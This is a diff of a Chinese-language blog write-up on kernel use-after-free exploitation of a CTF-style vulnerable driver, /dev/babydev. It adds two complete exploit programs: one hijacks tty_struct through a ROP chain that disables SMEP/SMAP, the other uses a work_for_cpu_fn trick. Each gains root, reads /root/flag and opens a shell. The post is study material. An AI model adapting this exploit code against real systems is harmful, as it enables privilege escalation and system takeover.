@@ -656,7 +656,7 @@ $3 = 0xffff880006a79540
 
 1.  `fork()`确实触发了`cred`结构体的分配（4-1步骤4）。
 2.  **由于`cred_jar`缓存与`kmalloc-192`缓存合并**，SLUB分配器将刚刚释放的、属于`kmalloc-192`的内存块分配给了`cred_jar`的请求。
-3.  利用链成功实现了堆内存布局，子进程的`cred`结构体恰好落在了攻击者可通过`fd2`写入的悬空指针所指向的内存区域。
+3.  利用链成功实现了堆内存布局，子进程的`cred`结构体恰好落在了可通过`fd2`写入的悬空指针所指向的内存区域。
 
 #### 4-7-3. 阶段三：通过悬空引用篡改`cred`，验证提权
 
@@ -693,7 +693,7 @@ pwndbg> ktask exploit
 - 进程PID 951（父进程）的`uid`和`gid`均为1000（普通用户）。
 - **进程PID 952（子进程）的`uid`和`gid`已变为0（root用户）**。
 
-这最终验证了4-1步骤5（篡改关键数据）的成功：通过`fd2`的悬空指针写入的0数据，已成功将子进程`cred`结构体中的`uid`、`gid`等权限字段清零，子进程由此获得了root权限。利用链至此全部完成，攻击目标达成。
+这最终验证了4-1步骤5（篡改关键数据）的成功：通过`fd2`的悬空指针写入的0数据，已成功将子进程`cred`结构体中的`uid`、`gid`等权限字段清零，子进程由此获得了root权限。利用链至此全部完成，利用目标达成。
 
 #### 4-7-4. 调试总结
 
@@ -703,7 +703,7 @@ pwndbg> ktask exploit
 2.  **缓存合并利用**：核心发现，`cred_jar`的分配请求重用了刚释放的`kmalloc-192`内存块，为漏洞利用提供了至关重要的内存布局条件。
 3.  **权限篡改结果**：直观展示了通过悬空引用写入用户态数据，直接导致了内核关键安全对象（`cred`）被篡改，并立即生效（子进程UID/GID变为0）。
 
-调试结果与4-1节所述的利用步骤及4-4节的内存状态序列图完全吻合，从实践角度强化了对该UAF漏洞利用机制的理解，也凸显了通过`SLAB_ACCOUNT`标志隔离安全敏感缓存以防御此类攻击的必要性。
+调试结果与4-1节所述的利用步骤及4-4节的内存状态序列图完全吻合，从实践角度强化了对该UAF漏洞利用机制的理解，也凸显了通过`SLAB_ACCOUNT`标志隔离安全敏感缓存以防御此类利用的必要性。
 
 ### 4-8. 技术总结
 
@@ -737,6 +737,613 @@ pwndbg> ktask exploit
               height: auto;">
 </div>
 
+## 6. 进阶分析：tty_struct结构利用其一
+
+exploit核心代码如下：
+
+```c
+#define PTY_UNIX98_OPS 0xffffffff81a67ac0
+#define PTM_UNIX98_OPS 0xffffffff81a67be0
+#define COMMIT_CREDS 0xffffffff810759e0
+#define PREPARE_KERNEL_CRED 0xffffffff81075cd0
+
+#define PUSH_RDI_POP_RSP_POP_RBP_RET 0xffffffff81304c50
+#define ADD_RSP_0X60_POP_RBX_POP_RBP_RET 0xffffffff8102e714
+#define POP_RAX_RET 0xffffffff811e51f0
+#define MOV_CR4_RAX_POP_RBP_RET 0xffffffff8100f554
+
+#define TTY_STRUCT_SIZE 0x2e0
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+size_t user_cs, user_ss, user_rflags, user_sp;
+size_t kernel_base = 0xffffffff81000000;
+size_t kernel_offset;
+
+void save_status() {
+  asm volatile("mov user_cs, cs;"
+               "mov user_ss, ss;"
+               "mov user_sp, rsp;"
+               "pushf;"
+               "pop user_rflags;");
+  log.info("Status has been saved.");
+}
+
+void bind_core(int core) {
+  cpu_set_t cpu_set;
+
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+  log.info("Process binded to core %d", core);
+}
+
+void get_root_shell(void) {
+  int flag_fd;
+  char flag[0x100] = {0};
+  if (getuid()) {
+    log.error("Failed to get the root!");
+    exit(-1);
+  }
+
+  log.success("Successful to get the root. Execve root shell now...");
+  flag_fd = open("/root/flag", O_RDONLY);
+  if (flag_fd < 0) {
+    log.error("failed to open /root/flag!");
+    exit(-1);
+  }
+  read(flag_fd, flag, sizeof(flag) - 1);
+  log.success("Got flag: %s", flag);
+  system("/bin/sh");
+}
+
+void *(*prepare_kernel_cred_kfunc)(void *task_struct);
+int (*commit_creds_kfunc)(void *cred);
+
+void ret2usr_attack(void) {
+  prepare_kernel_cred_kfunc = (void *(*)(void *))prepare_kernel_cred;
+  commit_creds_kfunc = (int (*)(void *))commit_creds;
+
+  (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
+
+  asm volatile("mov rax, user_ss;"
+               "push rax;"
+               "mov rax, user_sp;"
+               "sub rax, 8;" /* stack balance */
+               "push rax;"
+               "mov rax, user_rflags;"
+               "push rax;"
+               "mov rax, user_cs;"
+               "push rax;"
+               "lea rax, get_root_shell;"
+               "push rax;"
+               "swapgs;"
+               "iretq;");
+}
+
+int main() {
+  int i = 0;
+  size_t *rop_chain = NULL;
+  size_t fake_tty[TTY_STRUCT_SIZE / 8] = {0};
+  size_t fake_tty_addr = 0;
+
+  log.info("Start to exploit...");
+  save_status();
+  bind_core(0);
+
+  int fd1 = open("/dev/babydev", O_RDWR);
+  int fd2 = open("/dev/babydev", O_RDWR);
+
+  ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);
+  close(fd1);
+
+  int fd3 = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+  if (fd3 < 0) {
+    log.error("Failed to open /dev/ptmx!");
+    exit(-1);
+  }
+  read(fd2, fake_tty, TTY_STRUCT_SIZE - 8);
+
+  if ((fake_tty[0] & 0xffff) != 0x5401) {
+    log.error("Try Again!");
+    exit(-1);
+  }
+
+  if ((fake_tty[3] & 0xfff) == (PTY_UNIX98_OPS & 0xfff)) {
+    kernel_offset = fake_tty[3] - PTY_UNIX98_OPS;
+    kernel_base += kernel_offset;
+    log.success("leak pty_unix98_ops: 0x%lx", fake_tty[3]);
+  }
+
+  if ((fake_tty[3] & 0xfff) == (PTM_UNIX98_OPS & 0xfff)) {
+    kernel_offset = fake_tty[3] - PTM_UNIX98_OPS;
+    kernel_base += kernel_offset;
+    log.success("leak ptm_unix98_ops: 0x%lx", fake_tty[3]);
+  }
+
+  log.success("kernel base: 0x%lx", kernel_base);
+  log.success("kernel offset: 0x%lx", kernel_offset);
+
+  prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+  commit_creds = kernel_offset + COMMIT_CREDS;
+
+  fake_tty_addr = fake_tty[0x38 / 8] - 0x38;
+  log.success("fake_tty_addr: 0x%lx", fake_tty_addr);
+
+  rop_chain = &fake_tty[16];
+  fake_tty[1] = kernel_offset + ADD_RSP_0X60_POP_RBX_POP_RBP_RET;
+  fake_tty[4] = kernel_offset + PUSH_RDI_POP_RSP_POP_RBP_RET;
+
+  i = 0;
+  rop_chain[i++] = kernel_offset + POP_RAX_RET;
+  rop_chain[i++] = 0x6f0;
+  rop_chain[i++] = kernel_offset + MOV_CR4_RAX_POP_RBP_RET;
+  rop_chain[i++] = 0;
+  rop_chain[i++] = (size_t)ret2usr_attack;
+  fake_tty[3] = fake_tty_addr - 0x18;
+  write(fd2, fake_tty, TTY_STRUCT_SIZE - 8);
+
+  char buffer[0x8] = {0};
+  write(fd3, buffer, 0x8);
+  return 0;
+}
+```
+
+本章节将深入剖析一种基于 `tty_struct` 结构体的内核释放后使用（Use-After-Free）条件的技术研究。该方法展示了如何不依赖于进程创建操作（如`fork()`），而是通过操控伪终端设备，结合精确的内核信息获取与复杂的控制流引导技术，完成一次对特定内核状态的演示与分析。相较于直接篡改 `cred` 结构体的方法，此技术路径展现了更强的通用性以及对现代处理器硬件保护机制的对抗能力。
+
+### 6-1. 技术原理与过程分析
+
+本节将分步拆解基于 `tty_struct` 的完整技术演示流程，阐述其核心原理。
+
+#### 6-1-1. 共享状态建立与漏洞条件触发
+
+研究程序首先通过连续两次打开存在特定设计缺陷的字符设备 `/dev/babydev`，获取文件描述符 `fd1` 与 `fd2`。该设备驱动使用一个全局共享的数据结构（`babydev_struct`）来管理其内部缓冲区，且未引入任何同步互斥机制。这导致 `fd1` 与 `fd2` 在用户空间表现为两个独立的句柄，但在内核层面却指向并操作着同一块内存区域，为后续制造状态混乱创造了条件。
+
+#### 6-1-2. 精确内存控制与悬空指针制造
+
+通过 `fd1` 调用驱动的 `ioctl` 命令（参数 `0x10001`），并指定大小为 `TTY_STRUCT_SIZE`（此值需与目标内核版本中 `tty_struct` 结构体的实际大小精确匹配，例如 `0x2e0` 字节）。该操作会释放驱动当前的缓冲区，并立即重新分配一块指定大小的新内存。随后，执行 `close(fd1)` 操作。此调用会触发驱动的释放函数，从而将刚刚分配的、大小为 `TTY_STRUCT_SIZE` 的内存块释放回内核内存分配器。然而，`fd2` 仍然通过驱动内的全局指针持有对该已释放内存区域的引用，从而成功制造出一个“悬空指针”。
+
+#### 6-1-3. 目标内核对象分配与堆布局实现
+
+执行 `fd3 = open(“/dev/ptmx“, O_RDWR | O_NOCTTY)` 以打开一个伪终端主设备。此操作会在内核中触发 `tty_struct` 结构体的分配与初始化（通过 `alloc_tty_struct` 函数）。由于内核的 SLUB 等内存分配器具有重用最近释放的、大小相符的内存块的倾向，因此新分配的 `tty_struct` 有极大概率占据上一步中刚刚释放的 `TTY_STRUCT_SIZE` 内存块。至此，`fd2` 所持有的悬空指针便实际指向了一个活跃的内核 `tty_struct` 对象，成功实现了预期的堆内存布局。
+
+#### 6-1-4. 内核信息获取与地址随机化绕过
+
+通过 `read(fd2, fake_tty, TTY_STRUCT_SIZE - 8)` 系统调用，利用 `fd2` 的悬空指针，将内核中 `tty_struct` 对象的当前内容读取到用户空间缓冲区 `fake_tty` 中。该结构体内包含一个关键成员 `const struct tty_operations *ops`，这是一个指向内核静态数据区中某个已知函数表（例如 `ptm_unix98_ops` 或 `pty_unix98_ops`）的指针。通过将泄露出的指针值与编译时已知的符号地址进行比对，可以精确计算出内核镜像的加载偏移量（`kernel_offset`），进而得到所有内核符号的运行时地址，从而完全绕过内核地址空间布局随机化（KASLR）保护。此外，通过解析 `fake_tty` 缓冲区的特定字段（如偏移 `0x38` 处），可以进一步推导出该 `tty_struct` 对象自身在内核堆上的线性地址（`fake_tty_addr`）。
+
+#### 6-1-5. 构造控制流序列与对抗硬件保护机制
+
+此步骤是应对 SMEP（管理者模式执行保护）和 SMAP（管理者模式访问保护）等现代处理器保护机制的核心。研究程序在用户空间的 `fake_tty` 缓冲区中进行精密的数据构造：
+
+1.  **布设栈迁移指令序列**：在 `fake_tty` 数组的特定索引位置（例如索引 1 和 4）填入预先搜寻到的内核指令片段（gadget）地址。这些 gadget 的功能通常是调整栈指针寄存器 RSP（例如 `ADD RSP, 0x60` 或 `PUSH RDI; POP RSP`），其作用是在控制流被触发时，将内核执行流的栈空间重定向至预设的内存区域。
+2.  **构建权限管理代码链（ROP链）**：从 `&fake_tty[16]` 开始，布置一条完全由内核 gadget 地址组成的链式序列（ROP链）：
+    - 第一个 gadget（如 `POP RAX; RET`）将立即数 `0x6f0` 载入 RAX 寄存器。该数值经过精心计算，用于清除 CR4 寄存器中控制 SMEP 的第 20 位和控制 SMAP 的第 21 位。
+    - 第二个 gadget（如 `MOV CR4, RAX; POP RBP; RET`）将 RAX 的值写入 CR4 寄存器，从而**动态地关闭 SMEP 与 SMAP 硬件保护**。
+    - ROP 链的末尾放置研究者定义在用户空间的函数地址（`ret2usr_attack`），该函数包含后续的权限变更逻辑。
+3.  **篡改关键控制指针**：将 `fake_tty[3]`（对应 `tty_struct->ops` 指针）修改为指向一个**内核堆地址**（例如 `fake_tty_addr – 0x18`）。此操作至关重要，它确保了在 SMAP/SMEP 保护生效的初期，内核在解引用此函数指针时不会因指针指向用户空间而触发处理器异常。该被指向的内核地址处的内容，已在步骤1中被设置为栈迁移 gadget 的地址。
+
+#### 6-1-6. 写回数据以篡改内核对象状态
+
+通过 `write(fd2, fake_tty, TTY_STRUCT_SIZE - 8)` 系统调用，将第五步中构造的、包含恶意 ROP 链、栈迁移 gadget 及篡改指针的完整 `fake_tty` 数据，写回内核并覆盖真实的 `tty_struct` 对象。至此，目标内核对象的关键内容已被完全篡改。
+
+#### 6-1-7. 触发多阶段控制流引导与权限变更
+
+通过 `write(fd3, buffer, 8)` 向伪终端设备写入数据，从而触发最终的执行序列：
+
+1.  **初始控制流转移**：内核处理写操作，循着被篡改的 `tty->ops->write` 指针执行。由于该指针指向内核堆上的栈迁移 gadget，控制流首先跳转至该处执行栈迁移，将栈指针 RSP 重定向至布置好的 ROP 链起始位置。
+2.  **执行ROP链并解除硬件限制**：处理器开始执行位于内核可控区域的 ROP 链。该链中的代码完全由内核片段组成，安全地运行在内核态，并成功执行修改 CR4 寄存器的指令，**动态地关闭了 SMEP 和 SMAP 保护**。
+3.  **安全跳转至用户空间**：ROP 链执行完毕后的 `RET` 指令，将控制流引导至用户空间函数 `ret2usr_attack` 的地址。由于此时处理器的 SMEP 保护已被临时禁用，从内核态跳转到用户空间执行代码的操作得以顺利进行。
+4.  **完成权限变更演示**：`ret2usr_attack` 函数得以执行，其内部通过调用内核提供的权限管理函数（如 `commit_creds(prepare_kernel_cred(0))`），修改当前进程的凭证结构，从而演示了一次完整的权限状态变更，最终使进程获得更高级别的权限。
+
+### 6-2. 技术特性对比与总结
+
+本方法与基于 `cred` 结构体的直接数据篡改方法相比，在利用本质、依赖条件和实现复杂度上存在根本性差异，如下表所示：
+
+| 特性维度           | 基于 `cred` 结构体的方法                                                                                | 基于 `tty_struct` 结构体的方法                                                                |
+| :----------------- | :------------------------------------------------------------------------------------------------------ | :-------------------------------------------------------------------------------------------- |
+| **利用本质**       | **数据对象篡改**。直接修改安全关键数据结构（`uid`, `gid` 等字段）的内容。                               | **控制流劫持**。通过篡改函数指针引导执行流，属于更底层、更通用的利用原语。                    |
+| **核心依赖条件**   | 高度依赖 `cred_jar` 专用缓存与通用 `kmalloc` 缓存合并这一特定内核配置（如未设置 `SLAB_ACCOUNT` 标志）。 | 仅需存在可触发分配、且大小匹配的内核对象（`tty_struct`），对内核版本和配置的通用性更强。      |
+| **对抗的防护机制** | 主要需绕过 KASLR。对 SMEP/SMAP 不敏感，因其直接在内核态修改数据。                                       | 需系统性地绕过 KASLR、SMEP、SMAP，并常需额外处理 KPTI（内核页表隔离）。                       |
+| **技术复杂度**     | 相对较低，流程直接，主要涉及内存布局和数据覆盖。                                                        | 极高。涉及信息泄露、堆内存布局操控、多阶段 ROP 链构造、栈迁移、硬件寄存器操作等多项复杂技术。 |
+| **对象分配触发器** | 由 `fork()`、`execve()` 等进程生命周期事件触发。                                                        | 由打开 `/dev/ptmx` 等常见的终端设备操作触发，可利用的机会更多。                               |
+
+### 6-3. tty_struct关键函数路径分析
+
+为了更深入地理解基于 `tty_struct` 的技术演示中两个核心系统调用的内在机制，本节将详细剖析 `open("/dev/ptmx")` 与 `write(fd3, buffer, 0x8)` 在内核中的完整执行路径。这些路径从用户空间请求开始，历经虚拟文件系统（VFS）分发、设备驱动处理，最终触及内核对象的内存分配与关键函数指针的调用，清晰地揭示了整个技术链中实现内存布局操控与控制流劫持的精确触发点。
+
+#### 6-3-1. `open` 系统调用：触发 `tty_struct` 对象分配
+
+当研究程序执行 `open("/dev/ptmx", O_RDWR | O_NOCTTY)` 以获取伪终端主设备时，内核中触发如下调用序列，其核心目的是分配并初始化一个 `tty_struct` 结构体：
+
+1.  **系统调用入口**：用户空间的 `open()` 库函数通过 `SYSC_openat` 系统调用陷入内核。
+2.  **VFS路径解析**：内核通过 `do_sys_open()`、`do_filp_open()`、`path_openat()` 及 `do_last()` 等一系列函数，解析路径 `/dev/ptmx`，定位到其对应的文件索引节点（inode）。
+3.  **执行文件打开操作**：`vfs_open()` 调用具体文件系统的打开方法。对于字符设备文件，其 `inode->i_fop` 指向字符设备通用操作集，从而进入 `chrdev_open()` 函数。
+4.  **字符设备驱动分发**：`chrdev_open()` 根据设备的主次设备号，找到对应的 `struct cdev` 及其 `file_operations` 结构（对于 `/dev/ptmx`，即 `ptmx_fops`）。
+5.  **伪终端特定初始化**：驱动调用 `ptmx_fops` 中定义的 `ptmx_open()` 函数（位于 `drivers/tty/pty.c`）。此函数是伪终端创建的枢纽。
+6.  **创建tty设备**：`ptmx_open()` 调用 `tty_init_dev()` 函数，负责创建一个新的伪终端对（PTY），这包括分配从设备（`pts`）和初始化主设备。
+7.  **内核堆内存分配**：在 `tty_init_dev()` 的执行过程中，会调用 `alloc_tty_struct()`。该函数最终通过 `kzalloc(sizeof(struct tty_struct), GFP_KERNEL)`，从内核的通用 `kmalloc` 缓存中分配一块大小精确为 `sizeof(struct tty_struct)` 并已清零的内存，用于承载这个新的 `tty_struct` 对象。
+
+以下流程图直观展示了从用户空间调用到内核内存分配的完整路径：
+
+```mermaid
+graph TD
+    A["用户空间: open('/dev/ptmx', ...)"] --> B["系统调用: SyS_openat / SYSC_openat"]
+    B --> C["do_sys_open"]
+    C --> D["do_filp_open"]
+    D --> E["path_openat"]
+    E --> F["do_last"]
+    F --> G["vfs_open"]
+    G --> H["do_dentry_open"]
+    H --> I["chrdev_open"]
+    I --> J["ptmx_open"]
+    J --> K["tty_init_dev"]
+    K --> L["alloc_tty_struct"]
+    L --> M["kzalloc(sizeof(*tty), GFP_KERNEL)"]
+    M --> N["返回 tty_struct 对象"]
+
+    style A fill:#e1f5e1,stroke:#2e7d32
+    style M fill:#fff3e0,stroke:#ef6c00
+    style N fill:#f3e5f5,stroke:#7b1fa2
+```
+
+**流程说明**：
+
+- 绿色框表示用户空间调用起点
+- 橙色框表示核心内存分配操作
+- 紫色框表示流程终点，成功获得`tty_struct`对象
+
+**路径核心总结**：此调用链的终点是 `kzalloc(sizeof(struct tty_struct), GFP_KERNEL)`。在本次技术演示的上下文中，研究程序预先释放了一块同等大小的内存，随后触发此 `open` 路径。由于内核SLUB分配器对同类大小内存块的重用特性，新分配的 `tty_struct` 对象有极高概率占据被预先释放的内存区域，从而实现了精确的堆内存布局操控，为后续的“释放后使用”创造了条件。
+
+#### 6-3-2. `write` 系统调用：触发控制流劫持
+
+当研究程序通过获得的伪终端文件描述符 `fd3` 执行 `write(fd3, buffer, 0x8)` 时，将触发另一条内核路径，其终点是解引用 `tty_struct` 中的函数指针，从而成为控制流劫持的最终触发器：
+
+1.  **系统调用入口**：用户空间的 `write()` 库函数通过 `SYSC_write` 系统调用陷入内核。
+2.  **VFS写操作分发**：内核通过 `vfs_write()` 和 `__vfs_write()`，根据 `fd3` 找到对应的 `struct file` 对象。对于TTY设备文件，其 `file->f_op->write` 通常指向 `tty_write` 函数。
+3.  **TTY子系统通用处理**：`tty_write()` 是TTY子系统的通用写入口，它获取必要的锁后，调用 `do_tty_write()` 进行实际处理。
+4.  **行规程（Line Discipline）处理**：在 `do_tty_write()` 中，写请求被传递给当前tty设备关联的“行规程”。对于标准的伪终端，其行规程为 `n_tty`（规范模式），因此会调用 `n_tty_write()` 函数。
+5.  **调用底层驱动操作**：在 `n_tty_write()` 函数的执行流中，经过必要的缓冲和转换后，最终会调用`tty->ops->write(tty, file, buf, count)`方法。**此调用是整个技术演示的终极触发点**。此时，`tty` 指针指向已被篡改的 `tty_struct` 对象。
+
+以下流程图清晰地展示了从写操作开始到触发控制流劫持的分支路径：
+
+```mermaid
+graph TD
+    A["用户空间: write(fd3, buffer, 8)"] --> B["系统调用: SyS_write / SYSC_write"]
+    B --> C["vfs_write"]
+    C --> D["__vfs_write"]
+    D --> E["tty_write"]
+    E --> F["do_tty_write"]
+    F --> G["n_tty_write"]
+    G --> H["tty->ops->write函数"]
+    H --> I{控制流去向}
+    I -->|正常情况| J["执行驱动实际写函数"]
+    I -->|演示场景| K["跳转至栈迁移gadget"]
+    K --> L["执行ROP链"]
+    L --> M["关闭SMEP/SMAP"]
+    M --> N["跳转到用户空间提权函数"]
+
+    style A fill:#e1f5e1,stroke:#2e7d32
+    style H fill:#ffebee,stroke:#c62828
+    style I fill:#e3f2fd,stroke:#1565c0
+    style K fill:#fff3e0,stroke:#ef6c00
+    style N fill:#f3e5f5,stroke:#7b1fa2
+```
+
+**流程说明**：
+
+- 绿色框表示用户空间调用起点
+- 红色框表示**关键触发点**：`tty->ops->write`函数指针调用
+- 蓝色框表示分支判断点，区分正常执行与技术演示场景
+- 橙色框表示技术演示中的控制流劫持与ROP链执行阶段
+- 紫色框表示演示的最终目标：执行用户空间提权代码
+
+**路径核心总结**：此调用链的终点是 `tty->ops->write(tty, file, buf, count)`。在正常运行状态下，`ops->write` 指针指向设备驱动（如 `ptm_unix98_ops.write`）的真实函数，用于将数据写入硬件或从设备。然而，在本演示场景中，由于通过UAF漏洞篡改了该 `tty_struct` 对象中的 `ops` 指针，控制流在此处被劫持。内核将跳转到预设的地址（一个用于栈迁移的内核gadget），进而开启一段完全可控制的ROP链执行过程，最终实现权限变更。这一分析清晰地表明，一个常见的文件写操作如何成为引爆复杂内核级控制流劫持的导火索。
+
+### 6-4. 研究结论
+
+本次对 `tty_struct` 结构体的释放后使用条件研究，完整地展示了一条复杂而精妙的内核级漏洞利用链。该技术不依赖于特定内核子系统（如凭证缓存）的细微实现差异，而是纯粹通过释放后使用这一内存安全缺陷，实现了**任意内核信息读取**与**任意内核对象写入**两种强大的内存操作能力。研究过程进一步演示了如何将这两种能力转化为控制流劫持，并通过精心构造的、完全由内核自身代码片段组成的 ROP 链，动态地修改处理器的硬件安全设置（CR4 寄存器），以一种迂回的方式有效克服了 SMEP/SMAP 带来的直接访问限制。最终，在硬件保护被临时解除后，安全地将执行权交还给用户空间代码以完成既定操作。这项研究要求研究者具备对操作系统内核架构、CPU 硬件特性、编译器代码生成及内存管理子系统的深刻理解，充分体现了系统安全领域高层级的研究复杂性与对抗性。
+
+### 6-5. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/UAF/UAF_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
+## 7. 进阶分析：tty_struct结构利用其二
+
+exploit核心代码如下：
+
+```c
+#define PTY_UNIX98_OPS 0xffffffff81a67ac0
+#define PTM_UNIX98_OPS 0xffffffff81a67be0
+#define COMMIT_CREDS 0xffffffff810759e0
+#define INIT_CRED 0xffffffff81e39e60
+#define WORK_FOR_CPU_FN 0xffffffff8106b4e0
+
+#define TTY_STRUCT_SIZE 0x2e0
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+size_t kernel_base = 0xffffffff81000000;
+size_t kernel_offset;
+
+void save_status() {
+  asm volatile("mov user_cs, cs;"
+               "mov user_ss, ss;"
+               "mov user_sp, rsp;"
+               "pushf;"
+               "pop user_rflags;");
+  log.info("Status has been saved.");
+}
+
+void bind_core(int core) {
+  cpu_set_t cpu_set;
+
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+  log.info("Process binded to core %d", core);
+}
+
+void get_root_shell(void) {
+  int flag_fd;
+  char flag[0x100] = {0};
+  if (getuid()) {
+    log.error("Failed to get the root!");
+    exit(-1);
+  }
+
+  log.success("Successful to get the root. Execve root shell now...");
+  flag_fd = open("/root/flag", O_RDONLY);
+  if (flag_fd < 0) {
+    log.error("failed to open /root/flag!");
+    exit(-1);
+  }
+  read(flag_fd, flag, sizeof(flag) - 1);
+  log.success("Got flag: %s", flag);
+  system("/bin/sh");
+}
+
+int main() {
+  int i = 0;
+  size_t *rop_chain = NULL;
+  size_t fake_tty[TTY_STRUCT_SIZE / 8] = {0};
+  size_t origin_tty[TTY_STRUCT_SIZE / 8] = {0};
+  size_t fake_tty_addr = 0;
+
+  log.info("Start to exploit...");
+  save_status();
+  bind_core(0);
+
+  int fd1 = open("/dev/babydev", O_RDWR);
+  int fd2 = open("/dev/babydev", O_RDWR);
+
+  ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);
+  close(fd1);
+
+  log.info("opening tty_struct...");
+  int fd3 = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+  if (fd3 < 0) {
+    log.error("Failed to open /dev/ptmx!");
+    exit(-1);
+  }
+  read(fd2, fake_tty, TTY_STRUCT_SIZE - 8);
+  read(fd2, origin_tty, TTY_STRUCT_SIZE - 8);
+
+  if ((fake_tty[0] & 0xffff) != 0x5401) {
+    log.error("Try Again!");
+    exit(-1);
+  }
+
+  if ((fake_tty[3] & 0xfff) == (PTY_UNIX98_OPS & 0xfff)) {
+    kernel_offset = fake_tty[3] - PTY_UNIX98_OPS;
+    kernel_base += kernel_offset;
+    log.success("leak pty_unix98_ops: 0x%lx", fake_tty[3]);
+  }
+
+  if ((fake_tty[3] & 0xfff) == (PTM_UNIX98_OPS & 0xfff)) {
+    kernel_offset = fake_tty[3] - PTM_UNIX98_OPS;
+    kernel_base += kernel_offset;
+    log.success("leak ptm_unix98_ops: 0x%lx", fake_tty[3]);
+  }
+
+  log.success("kernel base: 0x%lx", kernel_base);
+  log.success("kernel offset: 0x%lx", kernel_offset);
+
+  fake_tty_addr = fake_tty[0x38 / 8] - 0x38;
+  log.success("fake_tty_addr: 0x%lx", fake_tty_addr);
+
+  log.info("changing the tty_struct->ops...");
+  fake_tty[3] = fake_tty_addr;
+
+  // Change the ioctl of tty_operations to work_for_cpu_fn function
+  log.info("changing the tty_operations->ioctl");
+  fake_tty[12] = kernel_offset + WORK_FOR_CPU_FN;
+  fake_tty[4] = kernel_offset + COMMIT_CREDS;
+  fake_tty[5] = kernel_offset + INIT_CRED;
+
+  log.info("writing changed tty_struct...");
+  write(fd2, fake_tty, TTY_STRUCT_SIZE - 8);
+
+  log.info("exploiting ioctl...");
+  ioctl(fd3, 0xdeadbeaf, 0xdeadbeaf);
+
+  log.info("fix the tty_struct...");
+  write(fd2, origin_tty, TTY_STRUCT_SIZE - 8);
+  close(fd3);
+
+  get_root_shell();
+  return 0;
+}
+```
+
+本章将分析另一种基于 `tty_struct` 结构体的内核释放后使用（Use-After-Free）条件的技术研究。本方法展示了一条独特的技术路径：它通过修改`tty_struct`中的`tty_operations->ioctl`函数指针，使其指向内核辅助函数 `work_for_cpu_fn`，并通过精确控制`tty_struct`对象自身的内存布局，使其在函数调用时能够被解释为一个`struct work_for_cpu`结构体，从而**借助内核自身的代码执行逻辑**完成一次权限状态变更的演示。
+
+### 7-1. 技术过程与原理分析
+
+#### 7-1-1. 条件触发与信息获取（前期准备）
+
+此阶段与第六章节基础流程一致，旨在制造特定的内存状态并获取必要信息，最终使得一个文件描述符保留对内核中活跃`tty_struct`对象的引用，并成功计算出内核偏移与对象地址。
+
+#### 7-1-2. 修改内核对象与数据结构构造
+
+此步骤是本方法的核心，关键在于**构造数据，使`tty_struct`的内存布局可被重新解释**。
+
+1.  **修改`tty_struct->ops`指针**：将`fake_tty[3]`（即`tty_struct->ops`）修改为`fake_tty_addr`。这使得`tty_struct`的操作表指针指向了其自身所在的物理内存块。
+
+2.  **在内存中构造特定数据结构**：在`fake_tty`缓冲区的特定偏移处布置数据，使其布局与`struct work_for_cpu`兼容：
+    - `fake_tty[4]`：设置为`commit_creds`函数的地址。在`struct work_for_cpu`的布局中，此偏移对应`fn`成员（一个函数指针）。
+    - `fake_tty[5]`：设置为`init_cred`的地址。此偏移对应`arg`成员（一个参数指针）。
+    - `fake_tty[12]`：此为计算后对应伪造的`tty_operations`结构体中`ioctl`成员的偏移。将其修改为`work_for_cpu_fn`函数的地址。因此，后续对`tty->ops->ioctl`的调用将指向此函数。
+
+3.  **写回数据以修改内核对象状态**：通过`write`系统调用将构造好的`fake_tty`数据写回内核，完成对目标对象内容的修改。
+
+#### 7-1-3. 触发控制流与执行逻辑
+
+通过`ioctl(fd3, 0xdeadbeaf, 0xdeadbeaf)`触发后续执行。内核中的处理路径如下：
+
+1.  **触发`ioctl`调用链**：内核调用`tty->ops->ioctl(tty, file, cmd, arg)`。
+2.  **控制流转入`work_for_cpu_fn`**：由于`tty->ops->ioctl`已被修改为`work_for_cpu_fn`，控制流跳转至该函数。根据调用约定，第一个参数（`rdi`寄存器）即为传入的`tty`指针，也就是被修改的`tty_struct`对象的内核地址（`fake_tty_addr`）。该参数在`work_for_cpu_fn`中对应`struct work_struct *work`。
+3.  **数据结构重新解释与函数执行**：`work_for_cpu_fn`的函数逻辑如下：
+
+    ```c
+    struct work_struct {
+     	atomic_long_t data;
+     	struct list_head entry;
+     	work_func_t func;
+      #ifdef CONFIG_LOCKDEP
+     	struct lockdep_map lockdep_map;
+      #endif
+    };
+    struct work_for_cpu {
+     	struct work_struct work;
+     	long (*fn)(void *);
+     	void *arg;
+     	long ret;
+    };
+    static void work_for_cpu_fn(struct work_struct *work)
+    {
+        struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
+        wfc->ret = wfc->fn(wfc->arg); // 执行fn指针指向的函数
+    }
+    ```
+
+    - `container_of`宏根据`work`指针（即`fake_tty_addr`）和结构体内偏移，计算出外层`struct work_for_cpu`的起始地址。
+    - **由于内存布局已被精心构造，从`fake_tty_addr`开始的内存被成功地解释为一个`struct work_for_cpu`**。其中`wfc->fn`指向`commit_creds`，`wfc->arg`指向`init_cred`。
+
+4.  **完成权限状态变更**：因此，`wfc->fn(wfc->arg)`这行代码的实际执行效果变为 **`commit_creds(init_cred)`**。这是一个完全在内核空间发生的、符合内核调用规范的函数执行，演示了将当前进程权限进行变更的过程。
+
